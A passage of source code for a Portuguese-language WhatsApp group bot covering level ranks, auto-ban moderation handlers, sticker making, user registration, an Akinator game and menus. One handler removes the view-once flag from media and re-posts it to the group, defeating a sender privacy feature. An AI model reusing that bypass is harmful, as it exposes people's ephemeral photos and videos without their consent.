        } else if (levelRole <= 39) {
    	        role = 'Lenda V ⚡'                
        } else if (levelRole <= 40) {
            role = 'Lendário 🔥'      
        } else if (levelRole <= 42) {
            role = 'Staff Grade 1 ﹀¹'
        } else if (levelRole <= 44) {
            role = 'Staff Grade 2 ﹀²'
        } else if (levelRole <= 46) {
            role = 'Staff Grade 3 ﹀³'
        } else if (levelRole <= 48) {
            role = 'Staff Grade 4 ﹀⁴'
        } else if (levelRole <= 50) {
            role = 'Staff Grade 5 ﹀⁵'
        } else if (levelRole <= 52) {
            role = 'Sergeant Grade 1 ︾¹'
        } else if (levelRole <= 54) {
            role = 'Sergeant Grade 2 ︾²'
        } else if (levelRole <= 56) {
            role = 'Sergeant Grade 3 ︾³'
        } else if (levelRole <= 58) {
            role = 'Sergeant Grade 4 ︾⁴'
        } else if (levelRole <= 60) {
            role = 'Sergeant Grade 5 ︾⁵'
        } else if (levelRole <= 62) {
            role = '2nd Lt. Grade 1 ♢¹ '
        } else if (levelRole <= 64) {
            role = '2nd Lt. Grade 2 ♢²'
        } else if (levelRole <= 66) {
            role = '2nd Lt. Grade 3 ♢³'
        } else if (levelRole <= 68) {
            role = '2nd Lt. Grade 4 ♢⁴'
        } else if (levelRole <= 70) {
            role = '2nd Lt. Grade 5 ♢⁵'
        } else if (levelRole <= 72) {
            role = '1st Lt. Grade 1 ♢♢¹'
        } else if (levelRole <= 74) {
            role = '1st Lt. Grade 2 ♢♢²'
        } else if (levelRole <= 76) {
            role = '1st Lt. Grade 3 ♢♢³'
        } else if (levelRole <= 78) {
            role = '1st Lt. Grade 4 ♢♢⁴'
        } else if (levelRole <= 80) {
            role = '1st Lt. Grade 5 ♢♢⁵'
        } else if (levelRole <= 82) {
            role = 'Major Grade 1 ✷¹'
        } else if (levelRole <= 84) {
            role = 'Major Grade 2 ✷²'
        } else if (levelRole <= 86) {
            role = 'Major Grade 3 ✷³'
        } else if (levelRole <= 88) {
            role = 'Major Grade 4 ✷⁴'
        } else if (levelRole <= 90) {
            role = 'Major Grade 5 ✷⁵'
        } else if (levelRole <= 92) {
            role = 'Colonel Grade 1 ✷✷¹'
        } else if (levelRole <= 94) {
            role = 'Colonel Grade 2 ✷✷²'
        } else if (levelRole <= 96) {
            role = 'Colonel Grade 3 ✷✷³'
        } else if (levelRole <= 98) {
            role = 'Colonel Grade 4 ✷✷⁴'
        } else if (levelRole <= 100) {
            role = 'Colonel Grade 5 ✷✷⁵'
        } else if (levelRole <= 102) {
            role = 'Brigadier Early ✰'
        } else if (levelRole <= 104) {
            role = 'Brigadier Silver ✩'
        } else if (levelRole <= 106) {
            role = 'Brigadier gold ✯'
        } else if (levelRole <= 108) {
            role = 'Brigadier Platinum ✬'
        } else if (levelRole <= 110) {
            role = 'Brigadier Diamond ✪'
        } else if (levelRole <= 112) {
            role = 'Major General Early ✰'
        } else if (levelRole <= 114) {
            role = 'Major General Silver ✩'
        } else if (levelRole <= 116) {
            role = 'Major General gold ✯'
        } else if (levelRole <= 118) {
            role = 'Major General Platinum ✬'
        } else if (levelRole <= 120) {
            role = 'Major General Diamond ✪'
        } else if (levelRole <= 122) {
            role = 'Lt. General Early ✰'
        } else if (levelRole <= 124) {
            role = 'Lt. General Silver ✩'
        } else if (levelRole <= 126) {
            role = 'Lt. General gold ✯'
        } else if (levelRole <= 128) {
            role = 'Lt. General Platinum ✬'
        } else if (levelRole <= 130) {
            role = 'Lt. General Diamond ✪'
        } else if (levelRole <= 132) {
            role = 'General Early ✰'
        } else if (levelRole <= 134) {
            role = 'General Silver ✩'
        } else if (levelRole <= 136) {
            role = 'General gold ✯'
        } else if (levelRole <= 138) {
            role = 'General Platinum ✬'
        } else if (levelRole <= 140) {
            role = 'General Diamond ✪'
        } else if (levelRole <= 142) {
            role = 'Commander Early ★'
        } else if (levelRole <= 144) {
            role = 'Commander Intermediate ⍣'
        } else if (levelRole <= 146) {
            role = 'Commander Elite ≛'
        } else if (levelRole <= 148) {
            role = 'The Commander Hero ⍟'
        } else if (levelRole <= 152) {
            role = 'Legends 忍'
        } else if (levelRole <= 154) {
            role = 'Legends 忍'
        } else if (levelRole <= 156) {
            role = 'Legends 忍'
        } else if (levelRole <= 158) {
            role = 'Legends 忍'
        } else if (levelRole <= 160) {
            role = 'Legends 忍'
        } else if (levelRole <= 162) {
            role = 'Legends 忍'
        } else if (levelRole <= 164) {
            role = 'Legends 忍'
        } else if (levelRole <= 166) {
            role = 'Legends 忍'
        } else if (levelRole <= 168) {
            role = 'Legends 忍'
        } else if (levelRole <= 170) {
            role = 'Legends 忍'
        } else if (levelRole <= 172) {
            role = 'Legends 忍'
        } else if (levelRole <= 174) {
            role = 'Legends 忍'
        } else if (levelRole <= 176) {
            role = 'Legends 忍'
        } else if (levelRole <= 178) {
            role = 'Legends 忍'
        } else if (levelRole <= 180) {
            role = 'Legends 忍'
        } else if (levelRole <= 182) {
            role = 'Legends 忍'
        } else if (levelRole <= 184) {
            role = 'Legends 忍'
        } else if (levelRole <= 186) {
            role = 'Legends 忍'
        } else if (levelRole <= 188) {
            role = 'Legends 忍'
        } else if (levelRole <= 190) {
            role = 'Legends 忍'
        } else if (levelRole <= 192) {
            role = 'Legends 忍'
        } else if (levelRole <= 194) {
            role = 'Legends 忍'
        } else if (levelRole <= 196) {
            role = 'Legends 忍'
        } else if (levelRole <= 198) {
            role = 'Legends 忍'
        } else if (levelRole <= 200) {
            role = 'Legends 忍'
        } else if (levelRole <= 210) {
            role = 'Legends 忍'
        } else if (levelRole <= 220) {
            role = 'Legends 忍'
        } else if (levelRole <= 230) {
            role = 'Legends 忍'
        } else if (levelRole <= 240) {
            role = 'Legends 忍'
        } else if (levelRole <= 250) {
            role = 'Legends 忍'
        } else if (levelRole <= 260) {
            role = 'Legends 忍'
        } else if (levelRole <= 270) {
            role = 'Legends 忍'
        } else if (levelRole <= 280) {
            role = 'Legends 忍'
        } else if (levelRole <= 290) {
            role = 'Legends 忍'
        } else if (levelRole <= 300) {
            role = 'Legends 忍'
        } else if (levelRole <= 310) {
            role = 'Legends 忍'
        } else if (levelRole <= 320) {
            role = 'Legends 忍'
        } else if (levelRole <= 330) {
            role = 'Legends 忍'
        } else if (levelRole <= 340) {
            role = 'Legends 忍'
        } else if (levelRole <= 350) {
            role = 'Legends 忍'
        } else if (levelRole <= 360) {
            role = 'Legends 忍'
        } else if (levelRole <= 370) {
            role = 'Legends 忍'
        } else if (levelRole <= 380) {
            role = 'Legends 忍'
        } else if (levelRole <= 390) {
            role = 'Legends 忍'
        } else if (levelRole <= 400) {
            role = 'Legends 忍'
        } else if (levelRole <= 410) {
            role = 'Legends 忍'
        } else if (levelRole <= 420) {
            role = 'Legends 忍'
        } else if (levelRole <= 430) {
            role = 'Legends 忍'
        } else if (levelRole <= 440) {
            role = 'Legends 忍'
        } else if (levelRole <= 450) {
            role = 'Legends 忍'
        } else if (levelRole <= 460) {
            role = 'Legends 忍'
        } else if (levelRole <= 470) {
            role = 'Legends 忍'
        } else if (levelRole <= 480) {
            role = 'Legends 忍'
        } else if (levelRole <= 490) {
            role = 'Legends 忍'
        } else if (levelRole <= 500) {
            role = 'Legends 忍'
        } else if (levelRole <= 600) {
            role = 'Legends 忍'
        } else if (levelRole <= 700) {
            role = 'Legends 忍'
        } else if (levelRole <= 800) {
            role = 'Legends 忍'
        } else if (levelRole <= 900) {
            role = 'Legends 忍'
        } else if (levelRole <= 1000) {
            role = 'Legends 忍'
        } else if (levelRole <= 2000) {
            role = 'Legends 忍'
        } else if (levelRole <= 3000) {
            role = 'Legends 忍'
        } else if (levelRole <= 4000) {
            role = 'Legends 忍'
        } else if (levelRole <= 5000) {
            role = 'Legends 忍'
        } else if (levelRole <= 6000) {
            role = 'Legends 忍'
        } else if (levelRole <= 7000) {
            role = 'Legends 忍'
        } else if (levelRole <= 8000) {
            role = 'Legends 忍'
        } else if (levelRole <= 9000) {
            role = 'Legends 忍'
        } else if (levelRole <= 10000) {
            role = 'Legends 忍'
       }
       /**********FIM**********/
                 	    
		
		//>> Porcentagem do nivel
		var per = '□□□□□□□□□□ 0%'
			const peri = 5000 * (Math.pow(2, getLevelingLevel(m.sender)) - 1)
			const perl = peri-getLevelingXp(m.sender) 
			const resl = Math.round(100-((perl/getLevelingXp(m.sender))*100))
			if (resl <= 10) {
				per = `■□□□□□□□□□ ${resl}%`
			} else if (resl <= 20) {
				per = `■■□□□□□□□□ ${resl}%`
			} else if (resl <= 30) {
				per = `■■■□□□□□□□ ${resl}%`
			} else if (resl <= 40) {
				per = `■■■■□□□□□□ ${resl}%`
			} else if (resl <= 50) {
				per = `■■■■■□□□□□ ${resl}%`
			} else if (resl <= 60) {
				per = `■■■■■■□□□□ ${resl}%`
			} else if (resl <= 70) {
				per = `■■■■■■■□□□ ${resl}%`
			} else if (resl <= 80) {
				per = `■■■■■■■■□□ ${resl}%`
			} else if (resl <= 90) {
				per = `■■■■■■■■■□ ${resl}%`
			} else if (resl <= 100) {
				per = `■■■■■■■■■■ ${resl}%`
			}
			/**********FIM**********/

if(isAntiImg && isBotAdmins && m.mtype == 'imageMessage') {
if (m.key.fromMe) return
if(isAdmins) return anya.sendText(from,'*mensagem proibida detectada, porém é admin logo a punição será anulada*', m)
await anya.sendText(from, '*mensagem proibida detectada, banindo...*', m)
setTimeout(async function () {
anya.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
}, 1000)
setTimeout(async function () {
anya.sendMessage(m.chat, { text: `${destrava22}`})
}, 2000)
setTimeout(async function () {
anya.sendMessage(m.chat, { text: `${destrava22}`})
}, 3000)
setTimeout(async function () {
anya.sendMessage(m.chat, { text: 'chat limpo, por favor não suba as mensagens pois pode ser trava.'}, {quoted: m})
}, 4000)
}

/**********ANTI DOC**********/
if(isAntidoc && isBotAdmins && m.mtype == 'documentMessage') {
if(isAdmins) return anya.sendText(from,'*documento proibido, porém é admin logo a punição será anulada*', m)
anya.sendText(from, 'Não permitimos envio de documentos no grupo, por questões de segurança de travas e etc..., então por conta disso, terei que ti remover, qualquer dúvida,entre em contato com algum adm.', m)
anya.groupSettingUpdate(m.chat, 'announcement')
setTimeout(() =>{
anya.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
}, 1000)
setTimeout( () => {
anya.groupSettingUpdate(m.chat, 'not_announcement')
}, 2000)
setTimeout(async function () {
anya.sendMessage(m.chat, { text: `${destrava22}`})
}, 1000)
setTimeout(async function () {
anya.sendMessage(m.chat, { text: `${destrava22}`})
}, 1000)
setTimeout(async function () {
anya.sendMessage(m.chat, { text: 'chat limpo, por favor não suba as mensagens pois pode ser trava.'}, {quoted: freply})
}, 1000)
}
/**********FIIM**********/			

if (m.isGroup && isAntiCatalogo && m.mtype == 'productMessage') {
if (isAdmins) return m.reply('Isso é um catálogo, mas vc é adm então ta de boa.')
m.reply('🔰Ƭrανα Ƈαтάℓσgσ ∂єтєcтαdσ\n❌Rємσνєη∂σ❌')
anya.groupSettingUpdate(m.chat, 'announcement')
setTimeout(async function () {
anya.groupParticipantsUpdate(m.chat, [m.sender], 'remove')
}, 1000)
setTimeout( () => {
anya.groupSettingUpdate(m.chat, 'not_announcement')
}, 1000)
setTimeout(async function () {
anya.sendMessage(m.chat, { text: `${destrava22}`})
}, 1000)
setTimeout(async function () {
anya.sendMessage(m.chat, { text: `${destrava22}`})
}, 1000)
setTimeout(async function () {
anya.sendMessage(m.chat, { text: 'chat limpo, por favor não suba as mensagens pois pode ser trava.'}, {quoted: m})
}, 1000)
}

if (m.isGroup && isViewOnce && isAntiVO) {
let typenya = m.message.viewOnceMessage.message["videoMessage"] ? m.message.viewOnceMessage.message.videoMessage : m.message.viewOnceMessage.message.imageMessage
 typenya["viewOnce"] = false
 typenya["caption"] = `Anti visualização única.\n\nLegenda:${typenya.caption}`
await sleep(500)
m.copyNForward(m.chat, true, { readViewOnce: true }).catch(_ => m.reply('Talvez tenha sido aberto por um bot'))
}

                if (!m.isGroup && isAutoStick) {
//m.reply(`Foto/video detectado, fazendo sua figu automática em instantes, aguarde.`)
                var numero = `${m.sender.split('@')[0]}`
                if (/image/.test(mime) && !/webp/.test(mime)) {
                let mediac = await quoted.download()
                await anya.sendImageAsSticker(from, mediac, m, { packname: `[🥜] USUÁRIO:\n[🥜] NUMERO:\n[🥜] DONO:\n[🥜] BOT:\n[🥜] LINK DO BOT`, author: `${pushname}\n` + lerNumber(numero) + `\nalone no shawty's\n${nomedobot}\nhttps://abre.bio/anya-md` })
                console.log(`Auto sticker detected`)
                } else if (m.mtype == 'videoMessage') {
m.reply(`Foto/video detectado, fazendo sua figu automática em instantes, aguarde.`)
                 if ((quoted.msg || quoted).seconds > 11) return m.reply('Máximo 10 segundos!')
                let mediac1 = await quoted.download()
                await anya.sendVideoAsSticker(from, mediac1, m, { packname: `[🥜] USUÁRIO:\n[🥜] NUMERO:\n[🥜] DONO:\n[🥜] BOT:\n[🥜] LINK DO BOT`, author: `${pushname}\n` + lerNumber(numero) + `\nalone no shawty's\n${nomedobot}\nhttps://abre.bio/anya-md` })
            }
         }
         
/*if (isCmd && budy.toLowerCase() != undefined) {
		    if (m.chat.endsWith('broadcast')) return
		    if (m.isBaileys) return
		    let msgs = global.db.database
		    if (!(budy.toLowerCase() in msgs)) return
		    anya.copyNForward(m.chat, msgs[budy.toLowerCase()], true)
        }   */      
        
/*==========[reply dos comandos de figu]==========*/        

async function ReplyFig() {
let buttons = [
                        { buttonId: `${prefix + command} -aqui`, buttonText: { displayText: `AQUI` }, type: 1 }, 
                        { buttonId: `${prefix + command} -pv`, buttonText: { displayText: `PV` }, type: 1 },                      
                    ]
                    await anya.sendButtonText(m.chat, buttons, `*_ANTES DEU ENVIAR AS FIGURINHAS PRECISO SABER, DESEJA Q EU ENVIE AS FIGURINHAS AQUI OU NO PV??_*`, `${watermark}`)        
}
async function ReplyFig1() {
let buttons = [
                        { buttonId: `!figuanime -aqui`, buttonText: { displayText: `AQUI` }, type: 1 }, 
                        { buttonId: `!figuanime -pv`, buttonText: { displayText: `PV` }, type: 1 },                      
                    ]
                    await anya.sendButtonText(m.chat, buttons, `*_ANTES DEU ENVIAR AS FIGURINHAS PRECISO SABER, DESEJA Q EU ENVIE AS FIGURINHAS AQUI OU NO PV??_*`, `${watermark}`)        
}
async function ReplyFig2() {
let buttons = [
                        { buttonId: `!figudecria -aqui`, buttonText: { displayText: `AQUI` }, type: 1 }, 
                        { buttonId: `!figudecria -pv`, buttonText: { displayText: `PV` }, type: 1 },                      
                    ]
                    await anya.sendButtonText(m.chat, buttons, `*_ANTES DEU ENVIAR AS FIGURINHAS PRECISO SABER, DESEJA Q EU ENVIE AS FIGURINHAS AQUI OU NO PV??_*`, `${watermark}`)        
}
async function ReplyFig3() {
let buttons = [
                        { buttonId: `!figujapinha -aqui`, buttonText: { displayText: `AQUI` }, type: 1 }, 
                        { buttonId: `!figujapinha -pv`, buttonText: { displayText: `PV` }, type: 1 },                      
                    ]
                    await anya.sendButtonText(m.chat, buttons, `*_ANTES DEU ENVIAR AS FIGURINHAS PRECISO SABER, DESEJA Q EU ENVIE AS FIGURINHAS AQUI OU NO PV??_*`, `${watermark}`)        
}
async function ReplyFig4() {
let buttons = [
                        { buttonId: `!figumagago -aqui`, buttonText: { displayText: `AQUI` }, type: 1 }, 
                        { buttonId: `!figumagago -pv`, buttonText: { displayText: `PV` }, type: 1 },                      
                    ]
                    await anya.sendButtonText(m.chat, buttons, `*_ANTES DEU ENVIAR AS FIGURINHAS PRECISO SABER, DESEJA Q EU ENVIE AS FIGURINHAS AQUI OU NO PV??_*`, `${watermark}`)        
}
async function ReplyFig5() {
let buttons = [
                        { buttonId: `!figuemoji -aqui`, buttonText: { displayText: `AQUI` }, type: 1 }, 
                        { buttonId: `!figuemoji -pv`, buttonText: { displayText: `PV` }, type: 1 },                      
                    ]
                    await anya.sendButtonText(m.chat, buttons, `*_ANTES DEU ENVIAR AS FIGURINHAS PRECISO SABER, DESEJA Q EU ENVIE AS FIGURINHAS AQUI OU NO PV??_*`, `${watermark}`)        
}
async function ReplyFig6() {
let buttons = [
                        { buttonId: `!figumeme -aqui`, buttonText: { displayText: `AQUI` }, type: 1 }, 
                        { buttonId: `!figumeme -pv`, buttonText: { displayText: `PV` }, type: 1 },                      
                    ]
                    await anya.sendButtonText(m.chat, buttons, `*_ANTES DEU ENVIAR AS FIGURINHAS PRECISO SABER, DESEJA Q EU ENVIE AS FIGURINHAS AQUI OU NO PV??_*`, `${watermark}`)        
}

/*==========[fim dos reply de comandos de figu]==========*/        

async function replyReg(teks) {
let buttonsntnssfww = [
{ buttonId: `!verify`, buttonText: { displayText: 'R E G I S T R A R' }, type: 1 },
]
await anya.sendButtonText(m.chat, buttonsntnssfww, `Ola ${pushname},
Para que o bot possa ser usado, faça seu registro clicando no botão abaixo
 `, `${watermark}`, m)
}
async function sendButRegis(from) {
anya.sendText(m.chat, `aguarde, cadastrando: ${pushname}...!`, m)
var serialUser = createSerial(18)
_registered.push(m.sender)
fs.writeFileSync('./database/registered.json', JSON.stringify(_registered))
addRegisteredUser(m.sender, serialUser)
let buttons = [
{buttonId: `${prefix}menu`, buttonText: {displayText: 'MENU'}, type: 1},
{buttonId: `${prefix}owner`, buttonText: {displayText: 'CRIADOR'}, type: 1}
]
const buttonMessage = {
image:ppnyauser,
//gifPlayback:true,
jpegThumbnail:img,
caption: `
┌──⊰「 REGISTRADO(A) 」
│
│➢🌷 Nome : ${pushname}
│➢🌷 Status : Verificado
│➢🌷 Link: wa.me/${m.sender.split('@')[0]}
│➢🌷 Id: ${serialUser}
│➢🌷 Total de usuários : ${_registered.length}
│
└──⊰
*Por favor, clique no botão abaixo para usar o bot*`,
footer: `${watermark}`,
buttons: buttons,
headerType: 4,
contextInfo: {
"mentionedJid": [m.sender],
"externalAdReply": {
"showAdAttribution": true,
"title": `ola ${pushname}`, 
"mediaType": 2, 
"thumbnail": ppnyauser,
"previewType": "IMAGE",
"mediaUrl": 'https://wa.me/+558898204406',
"sourceUrl": 'https://wa.me/+558898204406'
}}
}
anya.sendMessage(m.chat, buttonMessage, { quoted: m })
} 
switch(argsButton[0]) {
            case 'finakii':
                if(argsButton[1] === 'nao') return m.reply('*poxa, não foi desta vez 😔*') 
                m.reply('*eu venci, aeee 🥳*')
                akinator[0][from] = undefined
                fs.writeFileSync('./src/akinator.json', JSON.stringify(akinator, null, 2))
                break
            case 'akinator':
                if(argsButton[1] === 'nao') return m.reply('*Até a próxima amigo*') 
                if(akinator[0][from]) return m.reply('*Desculpe-me amigo alguem ja está jogando, aguarde pra chegar sua vez*')
                akinator[0][from] = {
                    id: from,
                    player: sender,
                    game: new Aki({region: 'pt'})
                }
                await akinator[0][from].game.start()
                listMessage = {
                    text: akinator[0][from].game.question,
                    footer: 'Mostrar opções',
                    buttonText: 'Opções',
                    title: "Pergunta",
                    sections: [{
                        title: 'selecione abaixo',
                        rows: [{
                            rowId: `!respakii 0`,
                            title: 'Sim',
                            description: ''
                        },
                        {
                            rowId: `!respakii 1`,
                            title: 'Não',
                            description: ''
                        },{
                            rowId: `!respakii 2`,
                            title: 'Não sei',
                            description: ''
                        },{
                            rowId: `!respakii 3`,
                            title: 'Provavelmente sim',
                            description: ''
                        },
                        {
                            rowId: `!respakii 4`,
                            title: 'Provavelmente não',
                            description: ''
                        }]
                    }]
                }
                anya.sendMessage(from, listMessage, {quoted:m})
                fs.writeFileSync('./src/akinator.json', JSON.stringify(akinator, null, 2))
            break
        }
        
const dbids = []
			for(i=0;i<dontback.length;++i) {
				dbids.push(dontback[i].groupId)
			}
			const isDontBack = (m.isGroup && dbids.indexOf(from) >= 0) ? true : false
switch(command) {
	
	
case 'resetaki':
                if (!isAdmins) return m.reply('Você precisa ser ADM pra utilizar este comando')
                akinator[0][from] = undefined
                fs.writeFileSync('./src/akinator.json', JSON.stringify(akinator, null, 2))
                buttons_opts = [
                    {buttonId: `!akinator sim`, buttonText: {displayText: 'Sim'}, type: 1},
                    {buttonId: `!akinator nao`, buttonText: {displayText: 'Não'}, type: 1},
                ]
                sendbuttonsMessage = {
                    text: `*Jogo reiniciado com sucesso! Deseja jogar outra partida*`,
                    footerText: 'Sim ou não?',
                    buttons: buttons_opts,
                    headerType: 1
                }
                anya.sendMessage(from, sendbuttonsMessage, {quoted:m})
                break
            case 'respakii':
             //   if(!m.message.listResponseMessage) return
                if(akinator[0][from] && akinator[0][from].player != sender) return m.reply('*Não é você que está jogando*')
                if(args.length < 1) return
                await akinator[0][from].game.step(args[0])
                if(akinator[0][from].game.progress > 85) {
                    await akinator[0][from].game.win()
                    teks = `Por acaso seu personagem é ${akinator[0][from].game.answers[0].name}?`
                    buttons_opts = [
                        {buttonId: `!finakii sim`, buttonText: {displayText: 'Sim'}, type: 1},
                        {buttonId: `!finakii nao`, buttonText: {displayText: 'Não'}, type: 1},
                    ]
                    sendbuttonsMessage = {
                        image: {url: akinator[0][from].game.answers[0].absolute_picture_path},
                        caption: `Já sei!\n\n${teks}`,
                        footerText: 'Sim ou não?',
                        buttons: buttons_opts,
                        headerType: 1
                    }
                    anya.sendMessage(from, sendbuttonsMessage, {quoted:m})
                } else {
                    listMessage = {
                        text: akinator[0][from].game.question,
                        footer: 'Mostrar opções',
                        buttonText: 'selecione uma opção',
                        title: "Pergunta",
                        sections: [{
                            title: 'selecione uma das opções',
                            rows: [{
                                rowId: `!respakii 0`,
                                title: 'Sim',
                                description: ''
                            },
                            {
                                rowId: `!respakii 1`,
                                title: 'Não',
                                description: ''
                            },{
                                rowId: `!respakii 2`,
                                title: 'Não sei',
                                description: ''
                            },{
                                rowId: `!respakii 3`,
                                title: 'Provavelmente sim',
                                description: ''
                            },
                            {
                                rowId: `!respakii 4`,
                                title: 'Provavelmente não',
                                description: ''
                            }]
                        }]
                    }
                    anya.sendMessage(from, listMessage, {quoted:m})
                }
            break
case 'resetaki':
                if (!isAdmins) return m.reply('Você precisa ser ADM pra utilizar este comando')
                akinator[0][from] = undefined
                fs.writeFileSync('./src/akinator.json', JSON.stringify(akinator, null, 2))
                buttons_opts = [
                    {buttonId: `!akinator sim`, buttonText: {displayText: 'Sim'}, type: 1},
                    {buttonId: `!akinator nao`, buttonText: {displayText: 'Não'}, type: 1},
                ]
                sendbuttonsMessage = {
                    text: `*Jogo reiniciado com sucesso! Deseja jogar outra partida*`,
                    footerText: 'Sim ou não?',
                    buttons: buttons_opts,
                    headerType: 1
                }
                anya.sendMessage(from, sendbuttonsMessage, {quoted:m})
                break
            case 'respakii':
                //if(!m.message.listResponseMessage) return
                if(akinator[0][from] && akinator[0][from].player != sender) return m.reply('*Não é você que está jogando*')
                if(args.length < 1) return
                await akinator[0][from].game.step(args[0])
                if(akinator[0][from].game.progress > 85) {
                    await akinator[0][from].game.win()
                    teks = `Por acaso seu personagem é ${akinator[0][from].game.answers[0].name}?`
                    buttons_opts = [
                        {buttonId: `!finakii sim`, buttonText: {displayText: 'Sim'}, type: 1},
                        {buttonId: `!finakii nao`, buttonText: {displayText: 'Não'}, type: 1},
                    ]
                    sendbuttonsMessage = {
                        image: {url: akinator[0][from].game.answers[0].absolute_picture_path},
                        caption: `Já sei!\n\n${teks}`,
                        footerText: 'Sim ou não?',
                        buttons: buttons_opts,
                        headerType: 1
                    }
                    anya.sendMessage(from, sendbuttonsMessage, {quoted:m})
                } else {
                    listMessage = {
                        text: akinator[0][from].game.question,
                        footer: 'Mostrar opções',
                        buttonText: 'TERMINE O JOGO OU PODERA SER REMOVIDO',
                        title: "Pergunta",
                        sections: [{
                            title: 'Opções',
                            rows: [{
                                rowId: `!respakii 0`,
                                title: 'Sim',
                                description: ''
                            },
                            {
                                rowId: `!respakii 1`,
                                title: 'Não',
                                description: ''
                            },{
                                rowId: `!respakii 2`,
                                title: 'Não sei',
                                description: ''
                            },{
                                rowId: `!respakii 3`,
                                title: 'Provavelmente sim',
                                description: ''
                            },
                            {
                                rowId: `!respakii 4`,
                                title: 'Provavelmente não',
                                description: ''
                            }]
                        }]
                    }
                    anya.sendMessage(from, listMessage, {quoted:m})
                }
            break
            case 'akinator':
                buttons_opts = [
                    {buttonId: 'akinator sim', buttonText: {displayText: 'Sim'}, type: 1},
                    {buttonId: 'akinator nao', buttonText: {displayText: 'Não'}, type: 1},
                    {buttonId: '!resetaki', buttonText: {displayText: 'resetar jogo'}, type: 1},
                ]
                sendbuttonsMessage = {
                    image: {url: "./src/akinator.jpg"},
                    caption: `olá ${pushname}, eu sou o akinator, deseja jogar?`,
                    footer: `${watermark}`,
                    buttons: buttons_opts,
                    headerType: 1
                }
                anya.sendMessage(from, sendbuttonsMessage, {quoted:m})
                break
case 'eujn': {
if (!m.isGroup) return m.reply(mess.group)
let pergunta = eununca[Math.floor(Math.random() * eununca.length)]
listMessage = {
                    text: pergunta,
                    footer: 'Mostrar opções',
                    buttonText: 'Opções',
                    title: "Pergunta",
                    sections: [{
                        title: 'selecione abaixo',
                        rows: [{
                            rowId: ``,
                            title: 'Eu já',
                            description: ''
                        },
                        {
                            rowId: ``,
                            title: 'Eu nunca',
                            description: ''
                        },{
                            rowId: `${prefix + command}`,
                            title: 'Proxima pergunta',
                            description: ''
                        }]
                    }]
                }
                anya.sendMessage(from, listMessage)
}
break
                case 'verify':{
if (isRegistered) return m.reply('vc já está cadastrado no banco de dados do bot!!!')
await sendButRegis(from)
}
break
case 'anagram':{
fs.writeFileSync(`./src/anagrama-${from}.json`, `${JSON.stringify(palavrasANA[Math.floor(Math.random() * palavrasANA.length)])}`)
let dataAnagrama2 = JSON.parse(fs.readFileSync(`./src/anagrama-${from}.json`))
m.reply( `
╭─────≽「 👾 ANAGRAMA 👾 」
│➽ DESCUBRA A PALAVRA
│➽ ANAGRAMA: ${dataAnagrama2.embaralhada}
│➽ DICA: ${dataAnagrama2.dica}
╰────────────────────────`)
}
break
case 'menu': {
if (!isRegistered) return replyReg('Oi irmão, verifique primeiro para que você possa usar o bot')
listMessage = {
                    text: `[🌸] clique abaixo e selecione o menu! [🌸]`,
                    footer: `${watermark}`,
                    buttonText: '----[ 🌸 CLIQUE AQUI 🌸 ]----',
                    title: `[🌸] olá ${pushname} [🌸]`,
                    sections: [{
                        title: '----[ 💎 𝐋𝐈𝐒𝐓𝐀 𝐃𝐄 𝐌𝐄𝐍𝐔𝐒️ 💎 ]----',
                        rows: [{
                            rowId: `!menu1`,
                            title: '[👾] 𝐌𝐄𝐍𝐔 𝐆𝐄𝐑𝐀𝐋 [👾]',
                            description: 'exibe o menu geral'
                        },
                        {
                            rowId: `!menupesq`,
                            title: '[🔎] 𝐌𝐄𝐍𝐔 𝐃𝐄 𝐏𝐄𝐒𝐐𝐔𝐈𝐒𝐀 [🔎]',
                            description: 'exibe o menu de pesquisas'
                        },
                        {
                            rowId: `!menuconverter`,
                            title: '[📌] 𝐂𝐎𝐍𝐕𝐄𝐑𝐓𝐄𝐑 [📌]',
                            description: 'exibe o menu de converter'
                        },
                        {
                            rowId: `!menugp`,
                            title: '[👤] 𝐌𝐄𝐍𝐔 𝐃𝐄 𝐆𝐑𝐔𝐏𝐎𝐒 [👤]',
                            description: 'exibe o menu de grupos'
                        },
                        {
                            rowId: `!menufun`,
                            title: '[🕹️] 𝐌𝐄𝐍𝐔 𝐃𝐄 𝐁𝐑𝐈𝐍𝐂𝐀𝐃𝐄𝐈𝐑𝐀𝐒 [🕹️]',
                            description: 'exibe o menu de brincadeiras'
                        },
                        {
                            rowId: `!alteradores`,
                            title: '[🎼] 𝐀𝐋𝐓𝐄𝐑𝐀𝐃𝐎𝐑𝐄𝐒 [🎼]',
                            description: 'exibe o menu de alteradores'
                        },
                        {
                            rowId: `!+18`,
                            title: '[🔞] 𝐍𝐒𝐅𝐖 [🔞]',
                            description: 'exibe o menu nsfw'
                        },
                        {
                            rowId: `!logos`,
                            title: '[🎨] 𝐋𝐎𝐆𝐎𝐒 [🎨]',
                            description: 'exibe o menu de logos'
                        },
                        {
                            rowId: `!menucriador`,
                            title: '[👑] 𝐌𝐄𝐍𝐔 𝐃𝐎 𝐂𝐑𝐈𝐀𝐃𝐎𝐑 [👑]',
                            description: 'exibe o menu do criador'
                        },
                        {
                            rowId: `!perfil`,
                            title: '[♟️] 𝐏𝐄𝐑𝐅𝐈𝐋 [♟️]',
                            description: 'exibe o seu perfil'
                        },  
                        {
                            rowId: `!akinator`,
                            title: '[🧞‍♂️] 𝐀𝐊𝐈𝐍𝐀𝐓𝐎𝐑 [️🧞‍♂️]',
                            description: 'exibe o jogo akinator'
                        
                        },
                                        {
										"title": "[🛒] 𝐂𝐀𝐑𝐑𝐈𝐍𝐇𝐎 𝐃𝐄 𝐅𝐈𝐆𝐔️𝐒 [🛒]",
										"description": "exibe o carrinho de figurinhas",
										"rowId": `${prefix}pacotefig`
										}
								]
							},
                            	{
								"title": "----[ 🤺 𝐂𝐑𝐈𝐀𝐃𝐎𝐑 🤺 ]----",
								"rows": [
									{
										"title": "criador",
										"description": "exibe o número do criador",
										"rowId": `${prefix}owner`
										}
								]
							}                     
						],
                }
                anya.sendMessage(from, listMessage, {quoted:m})
}
break 

case 'pacotefig': {
                listMessage = {
                    text: `Por favor, escolha uma opção abaixo`,
                    footer: `${watermark}`,
                    buttonText: '[🔥] 𝐂𝐋𝐈𝐐𝐔𝐄 𝐀𝐐𝐔𝐈 [🔥]',
                    title: `[🛒] 𝐂𝐀𝐑𝐈𝐍𝐇𝐎 𝐃𝐄 𝐅𝐈𝐆𝐔️𝐒 [🛒]\n\nolá ${pushname}`,
                    sections: [{
								"title": "[💎] 𝐏𝐀𝐂𝐎𝐓𝐄 𝐃𝐄 𝐅𝐈𝐆𝐔 [️💎]",
								"rows": [
									{
